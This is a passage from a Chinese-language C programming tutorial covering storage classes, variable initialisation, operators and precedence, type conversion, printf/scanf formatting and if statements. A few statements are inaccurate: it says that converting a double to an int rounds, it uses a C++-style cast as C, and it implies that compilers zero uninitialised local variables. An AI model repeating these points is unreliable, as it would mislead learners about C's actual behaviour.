(x,y)\n}\n```\n\n在这里的话我们在main函数下方去定义两个全局变量a和b，但是这个时候a和b的作用域仅仅在定义之后开始，也就是不包含main函数，那么这时候我们就需要用extern加以声明，使得a和b的作用域扩大到整个源程序\n\n```\n#include <stdio.h>\nint main(){\n\textern a,b;\n    return 0;\n}\nint a=10,b=20;\nint fun(int x,int y){\n    x=a;\n    y=b;\n    return (x,y)\n}\n```\n\n同样我们也可以通过这个去扩大全局变量的作用域到其他源文件中去\n\n#### static静态存储类型\n\n这个和extern相反，如果我们需要把一个全局变量的作用域仅限于当时的源文件，那么我们就在定义全局变量的时候加上static存储类别\n\n接下来我们讲一下变量的定义\n\n### 局部变量的定义\n\n```\n<数据类型> <变量名>\n```\n\n<变量名>可以由一个或多个相同类型的变量名组成，多个变量之间用逗号**,**分隔，变量由字母、数字和下划线组成，且以字母或下划线开头，符合标识符的命名规则\n\n那当我们给变量定义的时候系统都经过了哪些内存操作呢？\n\n#### 定义局部变量\n\n当我们在函数内或代码块中定义一个局部变量时，系统会在栈区分配内存。\n\n1. **栈帧创建**：当函数被调用或代码块被执行时，系统会创建一个新的栈帧（stack frame），用于存储该函数的局部变量和参数。\n2. **内存分配**：在栈帧中为局部变量分配空间。这个过程通常涉及调整栈指针（stack pointer），并为每个局部变量分配固定大小的内存。例如，声明 `int a;` 会在栈上为 `a` 分配 4 个字节（在大多数系统上，`int` 通常为 4 字节）。\n3. **初始化**：当我们对变量进行初始化或赋值后，变量才真正有了存在的意义\n\n#### 关于变量初始化问题\n\n在 C 语言中，如果变量没有显式初始化，那么它的默认值将取决于该变量的类型和其所在的作用域。\n\n对于全局变量，不同类型的变量在没有显式初始化时的默认值：\n\n- 整型变量（int、short、long等）：默认值为0。\n- 浮点型变量（float、double等）：默认值为0.0。\n- 字符型变量（char）：默认值为'\\0'，即空字符。\n- 指针变量：默认值为NULL，表示指针不指向任何有效的内存地址。\n- 数组、结构体、联合等复合类型的变量：它们的元素或成员将按照相应的规则进行默认初始化，这可能包括对元素递归应用默认规则。\n\n然而对于局部变量（在函数内部定义的非静态变量）不会自动初始化为默认值，它们的初始值是未定义的（包含垃圾值）。因此在我们定义一个变量的时候最好养成初始化赋值的习惯，这样有时候能避免很多潜在的错误（但是测试了一下好像现在的编译器都有了给未初始化的局部变量设置为0的功能）\n\n### 变量的分类\n\n局部变量\n\n其实和常量的知识相同，这里只讲一个上面遗漏的知识点，这里只说他们的存储方式\n\n- 整型变量是以二进制的方式存储的\n- 浮点型变量是以指数的方式存储的\n- 字符变量是以ASCII码的方式存储的\n\n各类无符号类型量所占的内存空间字节数其实和对应的有符号类型量相同\n\n> [!IMPORTANT]\n>\n> 因为无符号不能表示负数，但是他们的内存空间字节数是一样的，所以无符号类型量的值范围比有符号类型量的值范围扩大了一倍\n\n## 运算符\n\n运算就是对我们的数据进行加工和操作，而运算符就是用来记述运算的字符，而我们使用运算符去进行运算的对象被称为操作数，最基本的操作数就是我们前面讲的常量和变量\n\n根据操作数的不同，我们可以把运算符分为单目运算符和双目运算符以及三目运算符\n\n接下来我们看一下各种运算符\n\n### 算术运算符\n\n用于各类数值运算\n\n假设变量A=10，B=20\n\n| 运算符  |               描述               |       实例       |\n| :-----: | :------------------------------: | :--------------: |\n|    +    |         把两个操作数相加         | A + B 将得到 30  |\n|    -    | 从第一个操作数中减去第二个操作数 | A - B 将得到 -10 |\n|    *    |         把两个操作数相乘         | A * B 将得到 200 |\n|    /    |           分子除以分母           |  B / A 将得到 2  |\n| %(整数) |     取模运算符，整除后的余数     |  B % A 将得到 0  |\n|   ++    |     自增运算符，整数值增加 1     |  A++ 将得到 11   |\n|   --    |     自减运算符，整数值减少 1     |   A-- 将得到 9   |\n\n前面四个是双目运算符，后面两个是单目运算符(但是其中加号和减号也可以作为单目运算符，例如-<表达式>表示-1*<表达式>)\n\n> [!IMPORTANT]\n>\n> 1.两个运算量都应为同一类型，否则会自动进行类型转换\n>\n> 2.两个int类型数据相除，结果应为int类型，若商不是整数则会去掉小数部分，如果int和float或double类型相除，结果应为float或double类型\n\n接下来我们讲一下自增自减运算符中的一些小事情\n\n#### 关于自增自减\n\n前自增(自减)是先自增(自减)后运算，后自增(自减)是先运算后自增(自减)\n\n实践出真知，我们写个代码就知道了\n\n```c\n#include <stdio.h>\nint main(){\n\tint a=10;\n\tint c=0,d=0;\n\tc=a++;\n\tprintf(\"c=a++的结果是: %d\\n\",c);\n\td=++a;\n\tprintf(\"d=++a的结果是: %d\\n\",d);\n\treturn 0;\n}\n/*运算结果\nc=10\nd=12\n*/\n```\n\n其实这也跟运算符的优先级有关，具体的讲完运算符再细说，到这里只需要记住这个知识点就可以\n\n> [!IMPORTANT]\n>\n> 值得关注的是，如果我们在输出语句中使用了自增运算，那么其操作数的值也会随之改变\n\n```c\n#include <stdio.h>\nint main(){\n\tint a=3;\n\tint b=4;\n\tprintf(\"a++的结果是：%d\\n\",a++);\n\tprintf(\"此时a的结果是：%d\\n\",a);\n\tprintf(\"++b的结果是：%d\\n\",++b);\n\tprintf(\"此时b的结果：%d\\n\",b);\n\treturn 0;\n}\n```\n\n#### 关于算术表达式的tips\n\n- C表达式中的乘号不能省略，需要用\\*进行乘法运算\n- C表达式不存在分子分母的形式，存在时需要利用`\\`运算符\n- C表达式中往往可以使用圆括号来调节运算顺序，将从运算最里层的括号开始并由里向外进行运算\n\n### 强制类型转换\n\n当我们的两个操作数的数据类型不一致的时候，需要进行一定的类型转换，C语言提供了两种类型转换机制，一种是自动转换，一种是用户进行的强制转换\n\n#### 数据类型的自动转换\n\n因为基本数据类型都是对变量在内存中的申请空间大小的一种说明，但是变量的数值最终在内存中以0和1的组合来表示，不同数据类型也无非表示可以容纳0和1的组合长度不同而已，所以转换是存在的\n\n从容量角度考虑，小的空间的东西必然能放到大的空间里去，但是大空间的东西如果放到小空间里面则可能会导致错误例如丢失数据位。所以我们必须考虑数据在转换过程中是否能保证完整性\n\n发生混合运算的时候数据类型会进行自动转换，那转换的顺序是什么呢？\n\n```\nchar,short,int->unsigned->long->unsigned long->float->double->double long\n```\n\n这个顺序就是自动转换的顺序\n\n> [!IMPORTANT]\n>\n> 需要注意以下几个点:\n>\n> - 赋值运算符两边数据类型不一致的话，右边的类型会转化成左边的类型然后进行赋值\n> - 所有单精度的运算都会转换成双精度类型再进行运算\n> - char型和short型参与运算的时候都会先转化成int型再进行运算\n\n```c\n#include <stdio.h>\nint main(){\n\tint a=3;\n\tdouble b=2.15;\n\t//b=a;//3.0000000\n\ta=b;//2\n\t//printf(\"%lf\",b);\n\tprintf(\"%d\",a);\n\treturn 0;\n}\n```\n\n可以看到，当右边的类型长度比左边长时，数据会丢失一部分，**丢失的部分按四舍五入向前舍入**\n\n#### 数据类型的强制转换\n\n这种情况通常发生在用户希望自己指定一个类型，转化格式就是\n\n```\n(<数据类型>) <表达式> 或 <数据类型>(<表达式>)\n```\n\n实操\n\n```c\n#include <stdio.h>\nint main(){\n\tint a=3;\n\tdouble b=2.15;\n\t//b=a;//3.0000000\n\t//a=b;//2\n\t//printf(\"%lf\",b);\n    //printf(\"%d\",a);\n\tprintf(\"%lf\\n%d\",(double)a,int(b));\n\treturn 0;\n}\n/*运行结果\n3.000000\n2\n*/\n```\n\n> [!IMPORTANT]\n>\n> 类型转换运算符只是暂时的，它只是改变了临时存储单元中该变量的值的类型，并用改变的值参加表达式的计算\n\n### 关系运算符\n\n关系运算符是双目运算符，结合性均为左结合主要用于描述两个操作数之间的关系，返回结果只能为true或者false\n\n但是在C语言中并没有专门的布尔值去表示true和false，当为”true“的时候，表达式返回结果1；否则返回0\n\n使用格式\n\n```\n<运算量>关系运算符<运算量>\n```\n\n假设A=10，B=20\n\n| 运算符 | 描述                                                         | 实例            |\n| :----- | :----------------------------------------------------------- | :-------------- |\n| ==     | 检查两个操作数的值是否相等，如果相等则条件为真。             | (A == B) 为假。 |\n| !=     | 检查两个操作数的值是否相等，如果不相等则条件为真。           | (A != B) 为真。 |\n| >      | 检查左操作数的值是否大于右操作数的值，如果是则条件为真。     | (A > B) 为假。  |\n| <      | 检查左操作数的值是否小于右操作数的值，如果是则条件为真。     | (A < B) 为真。  |\n| >=     | 检查左操作数的值是否大于或等于右操作数的值，如果是则条件为真。 | (A >= B) 为假。 |\n| <=     | 检查左操作数的值是否小于或等于右操作数的值，如果是则条件为真。 | (A <= B) 为真。 |\n\n1. 字符数据的比较是按照ASCII码的值进行比较的，字符可作为整数参与运算和比较\n2. 在判断两个浮点数是否相等的时候，由于存储上的误差，会得出错误的结果\n\n#### 关系表达式\n\n用关系运算符将两个表达式连接起来的式子叫做关系表达式\n\n这两个表达式可以是算术表达式，关系表达式，逻辑表达式，赋值表达式，字符表达式\n\n关系表达式的返回值是一个逻辑值，即1或者0\n\n### 逻辑运算符\n\n假设A=1，B=0\n\n| 运算符 | 描述                                                         | 实例              |\n| :----- | :----------------------------------------------------------- | :---------------- |\n| &&     | 称为逻辑与运算符。如果两个操作数都非零，则条件为真。         | (A && B) 为假。   |\n| \\|\\|   | 称为逻辑或运算符。如果两个操作数中有任意一个非零，则条件为真。 | (A \\|\\| B) 为真。 |\n| !      | 称为逻辑非运算符。用来逆转操作数的逻辑状态。如果条件为真则逻辑非运算符将使其为假。 | !(A && B) 为真。  |\n\n### 位运算符\n\n假设变量 **A** 的值为 60，变量 **B** 的值为 13，用二进制表示就是:\n\nA = 0011 1100\n\nB = 0000 1101\n\n\\-----------------\n\nA&B = 0000 1100\n\nA|B = 0011 1101\n\nA^B = 0011 0001\n\n~A = 1100 0011\n\n| 运算符 | 描述                                                         | 实例                                                         |\n| :----- | :----------------------------------------------------------- | :----------------------------------------------------------- |\n| &      | 对两个操作数的每一位执行逻辑与操作，如果两个相应的位都为 1，则结果为 1，否则为 0。按位与操作，按二进制位进行\"与\"运算。运算规则：`0&0=0;    0&1=0;     1&0=0;      1&1=1;` | (A & B) 将得到 12，即为 0000 1100                            |\n| \\|     | 对两个操作数的每一位执行逻辑或操作，如果两个相应的位都为 0，则结果为 0，否则为 1。按位或运算符，按二进制位进行\"或\"运算。运算规则：`0|0=0;    0|1=1;    1|0=1;     1|1=1;` | (A \\| B) 将得到 61，即为 0011 1101                           |\n| ^      | 对两个操作数的每一位执行逻辑异或操作，如果两个相应的位值相同，则结果为 0，否则为 1。异或运算符，按二进制位进行\"异或\"运算。运算规则：`0^0=0;    0^1=1;    1^0=1;   1^1=0;` | (A ^ B) 将得到 49，即为 0011 0001                            |\n| ~      | 对操作数的每一位执行逻辑取反操作，即将每一位的 0 变为 1，1 变为 0。取反运算符，按二进制位进行\"取反\"运算。运算规则：`~1=-2;    ~0=-1;` | (~A ) 将得到 -61，即为 1100 0011，一个有符号二进制数的补码形式。 |\n| <<     | 将操作数的所有位向左移动指定的位数。左移 n 位相当于乘以 2 的 n 次方。二进制左移运算符。将一个运算对象的各二进制位全部左移若干位（左边的二进制位丢弃，右边补0）。 | A << 2 将得到 240，即为 1111 0000                            |\n| >>     | 将操作数的所有位向右移动指定的位数。右移n位相当于除以 2 的 n 次方。二进制右移运算符。将一个数的各二进制位全部右移若干位，正数左补 0，负数左补 1，右边丢弃。 | A >> 2 将得到 15，即为 0000 1111                             |\n\n### 赋值运算符\n\n赋值运算符是一种双目运算符，结合性从右到左\n\n> [!IMPORTANT]\n>\n> 在C语言中，等于号(=)并不是相等的意思，而是给操作数赋值，例如a=b，我们不能说成a等于b，而是从右到左看，是把b的值赋给a\n>\n> - 赋值运算符的左侧只能是变量，而右侧可以是常量，变量或者表达式\n\n| 运算符 | 描述                                                         | 实例                            |\n| :----- | :----------------------------------------------------------- | :------------------------------ |\n| =      | 简单的赋值运算符，把右边操作数的值赋给左边操作数             | C = A + B 将把 A + B 的值赋给 C |\n| +=     | 加且赋值运算符，把右边操作数加上左边操作数的结果赋值给左边操作数 | C += A 相当于 C = C + A         |\n| -=     | 减且赋值运算符，把左边操作数减去右边操作数的结果赋值给左边操作数 | C -= A 相当于 C = C - A         |\n| *=     | 乘且赋值运算符，把右边操作数乘以左边操作数的结果赋值给左边操作数 | C *= A 相当于 C = C * A         |\n| /=     | 除且赋值运算符，把左边操作数除以右边操作数的结果赋值给左边操作数 | C /= A 相当于 C = C / A         |\n| %=     | 求模且赋值运算符，求两个操作数的模赋值给左边操作数           | C %= A 相当于 C = C % A         |\n| <<=    | 左移且赋值运算符                                             | C <<= 2 等同于 C = C << 2       |\n| >>=    | 右移且赋值运算符                                             | C >>= 2 等同于 C = C >> 2       |\n| &=     | 按位与且赋值运算符                                           | C &= 2 等同于 C = C & 2         |\n| ^=     | 按位异或且赋值运算符                                         | C ^= 2 等同于 C = C ^ 2         |\n| \\|=    | 按位或且赋值运算符                                           | C \\|= 2 等同于 C = C \\| 2       |\n\n### 杂项运算符\n\n| 运算符   | 描述             | 实例                                 |\n| :------- | :--------------- | :----------------------------------- |\n| sizeof() | 返回变量的大小。 | sizeof(a) 将返回 4，其中 a 是整数。  |\n| &        | 返回变量的地址。 | &a; 将给出变量的实际地址。           |\n| *        | 指向一个变量。   | *a; 将指向一个变量。                 |\n| ? :      | 条件表达式       | 如果条件为真 ? 则值为 X : 否则值为 Y |\n\n其中我们要讲的就是三目运算符?:\n\n格式\n\n```\n<表达式1>?<表达式2>:<表达式3>\n```\n\n若表达式1为真则执行表达式2并返回表达式2的值，否则执行表达式3并返回表达式3的值，就这么简单\n\n到这里我们的运算符就讲完了，但是我们还有一个很重要的点需要讲那就是运算符的优先级\n\n## 运算符的优先级\n\n| 优先级 |  运算符号   |       描述       | 目数 |  结合性  |\n| :----: | :---------: | :--------------: | :--: | :------: |\n|   1    |     ()      |       括号       |      | 从左到右 |\n|   1    |     []      |       下标       |      | 从左到右 |\n|   1    |    .和->    |    成员运算符    |      | 从左到右 |\n|   1    |  .\\*和->\\*  |  成员指针运算符  |      | 从左到右 |\n|   2    |   ++和--    |     自增运算     | 单目 | 从右到左 |\n|   2    |    &和*     |  取地址和取内容  | 单目 | 从右到左 |\n|   2    |      !      |      逻辑非      | 单目 | 从右到左 |\n|   2    |      ~      |     按位取反     | 单目 | 从右到左 |\n|   2    |    +和-     |    正负号运算    | 单目 | 从右到左 |\n|   2    | (数据类型)  |   强制类型转换   | 单目 | 从右到左 |\n|   2    |   sizeof    |   返回字节大小   | 单目 | 从右到左 |\n|   3    |   *,/和%    | 乘法，除法和取余 | 双目 | 从左到右 |\n|   4    |    +和-     |      加减法      | 双目 | 从左到右 |\n|   5    |   <<和>>    |  左移位和右移位  | 双目 | 从左到右 |\n|   6    | <和<=,>和>= |     大于小于     | 双目 | 从左到右 |\n|   7    |   ==和!=    |   等于和不等于   | 双目 | 从左到右 |\n|   8    |      &      |      按位与      | 双目 | 从左到右 |\n|   9    |      ^      |     按位异或     | 双目 | 从左到右 |\n|   10   |     \\|      |      按位或      | 双目 | 从左到右 |\n|   11   |     &&      |      逻辑与      | 双目 | 从左到右 |\n|   12   |    \\|\\|     |      逻辑或      | 双目 | 从左到右 |\n|   13   |     ?:      |  三目条件运算符  | 三目 | 从右到左 |\n|   14   | 赋值运算符  |    赋值运算符    | 双目 | 从右到左 |\n|   15   |     ，      |    逗号运算符    |      | 从左到右 |\n\n算术运算符->关系运算符-> 位运算符->逻辑运算符->赋值运算符\n\n在这个模块里，还有一个很重要的基础知识需要我们去掌握\n\n## 基本输入输出操作\n\n讲完了数据的基本组成和一些基础知识，接下来最重要的就是要处理数据的输入和输出了，没有输出的程序是没有用的，没有输入的程序是不灵活的\n\nC语言提供了丰富的输入输出函数，我们这里只讲最常见的几种\n\n### 字符的输入和输出\n\n- putchar()函数\n\n语法\n\n```\nputchar(<字符表达式>);\n```\n\nputchar()函数是字符输出函数，功能是`输出单个字符`,其中字符表达式可以是字符型变量或整型变量\n\n- getchar()函数\n\n语法\n\n```\ngetchar();\n```\n\n当使用getchar的时候，用户输入的所有字符都会按照字符处理并依次送入缓冲区，以回车键结束输入\n\n- getch()函数\n\n功能:从键盘上读入一个字符\n\n- getche()函数\n\n从键盘上读入一个字符并返回到显示屏幕上;(getchar()函数也是从键盘上读入一个字符并带回显)\n\ngetchar()函数和后两个函数的区别:getchar()函数会等待用户输入回车后才接收结束，并将输入的字符全部送入缓冲区，并逐个显示到屏幕上，但只会返回第一个字符作为函数的返回值\n\n我们试一下\n\ngetchar() & putchar() 函数\n\n```c\n#include <stdio.h>\n \nint main( )\n{\n   int c;\n \n   printf( \"Enter a value :\");\n   c = getchar( );\n \n   printf( \"\\nYou entered: \");\n   putchar( c );\n   printf( \"\\n\");\n   return 0;\n}\n```\n\n然后我们来讲一下标准输入输出\n\n### 格式化数据的输入和输出\n\n#### printf()函数(格式输出函数)\n\n语法\n\n```\nprintf(<格式控制字符串>,<输出列表>)\n```\n\n- <格式控制字符串>是字符串形式,由`输出格式说明符`和`需要原样输出的字符`组成\n\n- <输出列表>是需要输出的一项或多项内容，内容之间用逗号隔开\n\n**输出格式说明符**由`%`和格式字符组成，也就是我们常说的占位符，它的作用是将输出列表中的数据转换为指定的格式输出\n\n组成部分:\n\n```c\n% 标志字符 0 m.n l或h 格式字符\n```\n\n参数讲解:\n\n- `%`是格式说明符的开始\n- 标志字符为`-`,`+`,`#`,空格四种\n\n| 标志字符 | 含义                                                         |\n| -------- | ------------------------------------------------------------ |\n| -        | 结果左对齐，右边填空格                                       |\n| +        | 输出符号(正号或负号)                                         |\n| 空格     | 输出值为正时冠以空格，为负时冠以负号                         |\n| #        | 对c,s,d,u类无影响，对o类在输出时候加前缀0；对x类在输出时加前缀0x；对e,g,f类当结果有小数点时才给出小数点 |\n\n实操一下\n\n```c\n#include <stdio.h>\nint main(){\n\tprintf(\"%6d\\n\",123);//表示右对齐，空位填空格 \n\tprintf(\"%-6d\\n\",456);//表示左对其，空位填空格\n\tprintf(\"%+d\\n\",123); //输出正号\n\tprintf(\"%#o,%#x\\n\",97,18);//输出八进制或十六进制数 \n\treturn 0;\n}\n```\n\n运行结果:\n\n![image-20250220224736482](../image/achieve/202411/C语言/image-20250220224736482.png)\n\n- 0表示空位填0\n\n改一下\n\n```c\n#include <stdio.h>\nint main(){\n\tprintf(\"%06d\\n\",123);//表示右对齐，空位填0 \n\tprintf(\"%-06d\\n\",456);//表示左对其，空位填0\n\tprintf(\"%+0d\\n\",123); //输出正号\n\tprintf(\"%#o,%#x\\n\",97,18);//输出八进制或十六进制数 \n\treturn 0;\n}\n```\n\n![image-20250220224955343](../image/achieve/202411/C语言/image-20250220224955343.png)\n\n- m.n：m为输出最小宽度，用十进制表示输出的最少位数，例如我们上面的%6d就是输出位数为6，没有的地方用空格补齐。若实际位数大于指定宽度则按实际位数输出，否则补以0或空格。n为精度，精度格式符以`.`开头，后跟十进制整数，如果输出数字则表示小数的位数(末位做四舍五入)，如果输出字符则表示输出字符的个数，若实际位数大于所定精度，则截去多余部分\n\n实操一下\n\n```c\n#include <stdio.h>\nint main(){\n//\tprintf(\"%06d\\n\",123);//表示右对齐，空位填0 \n//\tprintf(\"%-06d\\n\",456);//表示左对其，空位填0\n//\tprintf(\"%+0d\\n\",123); //输出正号\n//\tprintf(\"%#o,%#x\\n\",97,18);//输出八进制或十六进制数\n\tprintf(\"%2d\\n\",123);//实际位数大于指定宽度\n\tprintf(\"%010.2f\\n\",123.4); //设置精度为2,空位用0补齐 \n\treturn 0;\n}\n```\n\n![image-20250220230054122](../image/achieve/202411/C语言/image-20250220230054122.png)\n\n- l或h表示输出长度修正,l表示按长整型或双精度输出\n- 格式字符表示输出类型\n\n| 格式字符 |                    含义                    |\n| :------: | :----------------------------------------: |\n|  d(或i)  | 以十进制形式输出带符号整数(正数不输出符号) |\n|    o     |  以八进制形式输出无符号整数(不输出前缀0)   |\n|  x(或X)  | 以十六进制形式输出无符号整数(不输出前缀0x) |\n|    u     |         以十进制形式输出无符号整数         |\n|    f     |         以小数形式输出单双精度实数         |\n|  e(或E)  |         以指数形式输出单双精度实数         |\n|  g(或G)  |   以%f或%e中较短的输出宽度输出单双浮点数   |\n|    c     |                输出单个字符                |\n|    s     |                 输出字符串                 |\n\n格式字符应该与我们要输出项的数据类型一致\n\n#### scanf()函数(格式输入函数)\n\n语法\n\n```\nscanf(<格式控制字符串>,<变量地址列表>)\n```\n\n在scanf中，其格式控制字符串包含以下三类不同的字符\n\n- 输入格式说明符:和输出格式说明符基本相同\n- 空白字符:意味着在读取输入的时候会除去输入的空白字符\n\n格式控制字符串要求我们也要将里面的普通字符原样输入例如:\n\n```\nscanf(\"%d,%d\",&a,&b);\n我们需要输入的格式为:\n1,2   其中除去输入格式说明符以外的符号都要原样输入\n```\n\n变量地址列表，看到这个很多人会问为什么是取变量的地址而不是变量？这个问题的话就设计到变量的声明和赋值操作了，前面也有讲过怎么处理变量的，应该可以理解\n\n<变量地址列表>要求必须是地址表达式例如&a,&b\n\n- 输入格式说明符\n\n格式\n\n```\n% * m l或h 格式字符\n```\n\n重复的就不讲了\n\n- `*`表示该输入项读取后不赋予相应的变量，即跳过该输入值\n\n实操\n\n```c\n#include <stdio.h>\nint main(){\n\tint a=0;\n\tscanf(\"%*d\",&a);\n\tprintf(\"%d\",a);\n\treturn 0; \n}\n/*\n输入2\n输出0\n*/\n```\n\n可以看到这里的a的值并没有变，所以带\\*号后输入会被丢弃\n\n- m表示截取输入的宽度(即字符数)\n\n实操\n\n```c\n#include <stdio.h>\nint main(){\n//\tint a=0;\n//\tscanf(\"%*d\",&a);\n//\tprintf(\"%d\",a);\n\tint a=0,b=0;\n\tscanf(\"%2d%*3d%2d\",&a,&b);\n\tprintf(\"%d%d\",a,b);\n\treturn 0; \n}\n/*\n输入1234567\n输出1267\n*/\n```\n\n这里可以看到我们输入的数字前两个12被分给了a，中间345因为\\*而被丢弃，最后67被分给了b\n\n> [!IMPORTANT]\n>\n> 一个很容易忽视的点，就是scanf函数中没有精度控制，例如scanf(\"%5.2f\",&a);是非法的\n>\n> 在 C 语言中，`scanf()` 函数在读取数据失败时返回 `EOF`\n\n另外我们讲一个比较细的点，就是当scanf函数输入多项数据的时候，系统是如何知道哪些算作一个数据项呢?这就不得不说其工作机制了\n\n![image-20250301113547441](../image/achieve/202411/C语言/image-20250301113547441.png)\n\n2.根据格式项中指定的域宽度分割出数据项，就比如我们上面的例子\n\n3.我们常用的分隔符都是可以分割数据项的，但是在%c输入字符的时候这些则也被认定为有效字符\n\n那么scanf在执行过程中怎么知道自己该停止了呢?\n\n1.格式参数的格式项用完了就会停止\n\n2.发生格式项与输入域不匹配的时候会出现非正常停止\n\n# c语言程序流程\n\n我们先来了解一下算法\n\n## 算法和结构化程序设计\n\n算法有两大要素:操作和控制结构\n\n> [!IMPORTANT]\n>\n>  一个算法可以用0或多个输入，但必须有至少一个输出\n\n结构化程序设计的基本思想是采用\"自顶向下，逐步求精\"的程序设计方法和”单入口单出口“的控制结构\n\nC语句是对程序运行时候计算机所作的工作的描述，可以分成`操作运算语句`和`流程控制语句`\n\n### 操作运算语句\n\n操作运算语句就是我们计算机需要执行的运算操作，例如我们的赋值语句，算术运算等都是属于我们的操作运算语句\n\n操作语句可以分成四种:表达式语句，函数调用语句，复合语句，空语句。\n\n- 表达式语句\n\n执行表达式语句就是计算表达式的值，比如我们的算术表达式，赋值表达式等组成的运算语句\n\n格式\n\n```\n表达式;\n```\n\n### 关于赋值的额外补充\n\n> [!IMPORTANT]\n>\n> 重点讲一下这里比较重要的点是关于赋值语句和变量声明的时候赋初始值的区别\n>\n> 1.给变量赋初始值是变量声明的一部分，变量之间用逗号隔开，而赋值语句以分号结尾\n>\n> 2.在赋值符号右边的表达式也可以是赋值表达式，例如:变量=(变量=表达式);所以只要满足左边是变量右边是赋值表达式或其他表达式\n>\n> 3.在变量声明中，不允许连续给多个变量赋初始值，例如int a=b=1;是错误的，而赋值语句中a=b=1;是允许的\n>\n> 4.赋值表达式和赋值语句是不一样的，有些地方规定是需要写表达式的话写赋值语句是不合法的，例如if(x=a+b;)因为x=a+b;是赋值语句，是不合法的\n\n- 函数调用语句\n\n由函数表达式加一个分号组成\n\n格式\n\n```\n函数名(实际参数表)\n```\n\n执行函数调用语句就是调用函数体并把实际参数传入到函数定义的形式参数中去，然后执行被调函数体中的语句\n\n- 复合语句\n\n其实就是语句块，用一对花括号括在一起的语句的整体就是复合语句，里面每条语句以分号结尾且花括号外不能加分号\n\n- 空语句\n\n没啥好说的，就是啥都没有，只有一个分号\n\n### 流程控制语句\n\n控制结构是C语言中用于控制程序流程的重要工具，三种基本控制结构**包括顺序结构、选择结构和循环结构**，但是流程控制语句是讲的后两种结构语句\n\n那我们接下来讲一下控制语句\n\n控制语句包括`条件控制语句`和`无条件控制语句`\n\n- 有条件控制语句就包括了选择结构，循环结构\n- 无条件控制语句包括break语句,continue语句,return返回语句,goto语句\n\n我们接下来一个个进行讲解\n\n## 有条件控制语句\n\n## 顺序结构\n\n顺序结构是`按程序语句书写的先后执行语句序列的操作`，顺序结构中的语句序列形成一个数据块\n\n顺序结构语句主要包括表达式语句，空语句，复合语句和函数调用语句\n\n举个例子，比如我们需要分解一个四位数整数的个位百位千位等各个位数并输出，怎么去通过代码去实现\n\n```c\n#include <stdio.h>\nint main(){\n\tint a=0,b=0,c=0,d=0;\n\tint num=0; \n\tprintf(\"please input a integer to us\\n\");\n\tscanf(\"%d\",&num);//输入四位数 \n\ta=num/1000;//千位\n\tb=num%1000/100;//百位\n\tc=num%100/10;//十位\n\td=num%10;//个位\n\tprintf(\"About %d,the first num is %d\\n\",num,a);\n\tprintf(\"The second num is %d\\n\",b);\n\tprintf(\"The third is %d\\n\",c);\n\tprintf(\"The fourth num is %d\\n\",d);\n\treturn 0;\n}\n```\n\n## 选择结构\n\nC语言提供了可以进行逻辑判断的若干选择语句，由这些语句可构成程序中的选择结构，通常又被称为”分支结构“。就是我们常见的选择语句和判断语句\n\n选择结构包括条件语句和开关语句\n\n### if语句\n\n- 不含else的if语句\n- 含else的if语句\n- 嵌套if语句\n\n#### 不含else的if语句(单分支选择结构)\n\n```\nif(表达式)\n{\n   /* 如果表达式为真将执行的语句 */\n}\n\n```\n\n如果布尔表达式为 **true**，则 if 语句内的代码块将被执行。如果布尔表达式为 **false**，则 if 语句结束后的第一组代码（闭括号后）将被执行。\n\n执行过程:\n\n![image-20250221152225357](../image/achieve/202411/C语言/image-20250221152225357.png)\n\n#### 含else 的if语句(双分支选择结构语句)\n\n```\nif(表达式)\n{\n   /* 如果表达式为真将执行的语句 */\n}\nelse\n{\n   /* 如果表达式为假将执行的语句 */\n}\n```\n\n如果布尔表达式为 **true**，则执行 **if** 块内的代码。如果布尔表达式为 **false**，则执行 **else** 块内的代码。\n\n双分支选择结构语句执行过程\n\n![C 中的 if...else 语句](../image/achieve/202411/C语言/c-if-else-20200923.svg)\n\n这个的话其实和三目运算符(?:)差不多\n\n#### if...else if...else 语句\n\n当使用 if...else if...else 语句时，以下几点需要注意：\n\n- 一个 if 后可跟零个或一个 else，else 必须在所有 else if 之后。\n- 一个 if 后可跟零个或多个 else if，else if 必须在 else 之前。\n- 一旦某个 else if 匹配成功，其他的 else if 或 else 将不会被测试。\n\n语法结构\n\n```\nif(布尔表达式 1)\n{\n   /* 当布尔表达式 1 为真时执行 */\n}\nelse if( 布尔表达式 2)\n{\n   /* 当布尔表达式 2 为真时执行 */\n}\nelse if( 布尔表达式 3)\n{\n   /* 当布尔表达式 3 为真时执行 */\n}\nelse \n{\n   /* 当上面条件都不为真时执行 */\n}\n\n```\n\n#### if语句的嵌套\n\n就是在一个if语句中又包含一个或多个if语句的嵌套\n\n语法\n\n```\nif( 布尔表达式 1)\n{\n   /* 当布尔表达式 1 为真时执行 */\n   if(布尔表达式 2)\n   {\n      /* 当布尔表达式 2 为真时执行 */\n   }\n}\n```\n\n\n\n> [!IMPORTANT]\n>\n> 需要格外注意的就是if和else的配对，在C语言中规定，每个else只和其前面最近的未配对的if配对\n\n组成结构\n\n![fdaa8182ee9ff7dd811cba11d79189df_720](../image/achieve/202411/C语言/fdaa8182ee9ff7dd811cba11d79189df_720.png)\n\n其实正常的if语句都是没有花括号的，但是如果担心自己会弄混淆的话可以在每个if语句后加上一个花括号，另外做一些缩进，这样能避免自己代码审不清楚\n\n我们再把上面的那个例题加入一些if语句\n\n```c\n#include <stdio.h>\nint main(){\n\tint a=0,b=0,c=0,d=0;\n\tint num=0; \n\tprintf(\"please input a integer to us\\n\");\n\tscanf(\"%d\",&num);//输入四位数 \n\ta=num/1000;\n\tb=num%1000/100;\n\tc=num%100/10;\n\td=num%10;\n\tif(a!=0)\n\t{\n\t\tprintf(\"About %d,the first num is %d\\n\",num,a);\n\t}\n\tif(b!=0){\n\t\tprintf(\"The second num is %d\\n\",b);\n\t}\n\tif(c!=0){\n\t\tprintf(\"The third is %d\\n\",c);\n\t}\n\tif(d!=0)\n\t{\n\t\tprintf(\"The fourth num is %d\\n\",d);\n\t}\n\treturn 0;\n}\n```\n\n然后也可以用if嵌套\n\n```c\n#include <stdio.h>\nint main(){\n\tint a=0,b=0,c=0,d=0;\n\tint num=0; \n\tprintf(\"please input a integer to us\\n\");\n\tscanf(\"%d\",&num);//输入四位数 \n\ta=num/1000;\n\tb=num%1000/100;\n\tc=num%100/10;\n\td=num%10;\n\tif(a!=0){\n\t\tprintf(\"The number have 4,%d,%d,%d,%d\",a,b,c,d);\n\t}else if(b!=0){\n\t\tprintf(\"The number have 3,%d,%d,%d\",b,c,d);\n\t}else if(c!=0){\n\t\tprintf(\"The number have 2,%d,%d\",c,d);\n\t}else{\n\t\tprintf(\"The number have 1,%d\",d);\n\t}\n\treturn 0;\n}\n```\n\n### 